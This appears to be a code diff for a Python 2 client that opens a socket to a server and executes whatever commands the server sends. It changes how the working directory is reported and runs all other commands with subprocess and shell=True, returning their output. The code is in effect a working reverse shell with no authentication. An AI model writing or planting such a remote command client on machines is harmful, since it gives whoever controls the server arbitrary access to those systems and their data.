@@ -12,9 +12,7 @@ import os
 import subprocess
 import socket
 import struct
-
 import json
-
 from subprocess import check_output
 
 # To get home directory
@@ -27,28 +25,29 @@ def connectToServer():
 	print "Trying to connect to: {} at {}".format(host, port)
 	s.connect((host,port))
 
-	# Initially, send current working directory to server
-	currentDir = os.getcwd()
-	print "Sending working directory: {}".format(currentDir)
-	#todo: Bring back
-	#s.sendall(currentDir)
-
-	# Keep listening for instructions
+	# Keep listening for instructions as terminal commands
 	while True: 
 		print "Waiting for command..."
 		data = s.recv(1024)	# Receive command from server
 		print "raw data from server: {}".format(data)
 		data = json.loads(data)
-		
+		print "jsonloads data is: {}".format(data)
 		# Extract commands into separate words
 		commandsWords = data.split()
 		
 		# Other data to send back to client
 		exception = ""
 		commandOutput = ""
-	
+		
+		# Initially, when asked will send current working directory to server
+		if data == "getCurrentPath":
+			currentDir = os.getcwd()
+			print "Sending working directory: {}".format(currentDir)
+			send_msg(s, currentDir)
+			continue
+
 		# Handle case of changing directories
-		if commandsWords[0] == "cd":
+		elif commandsWords[0] == "cd":
 			try:
 				if commandsWords[1] == "~": # Go to ~ (root) folder
 					home = expanduser("~")
@@ -67,9 +66,9 @@ def connectToServer():
 		# Other commands like ls, python --version etc
 		else:			
 			try:		
-				# Todo: Find better way to get output of script rather than just saying tried
+				# Todo: Find better way to get output of script rather than just saying "tried running script"
 				# Todo: Handle cases of '&' at end or not to run script in background
-				# Todo: Right now, scripts can be run with "nohup" command
+				# Todo: IMP - Right now, scripts can be run with "nohup" command
 
 				# Pipes any output to standard stream				
 				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
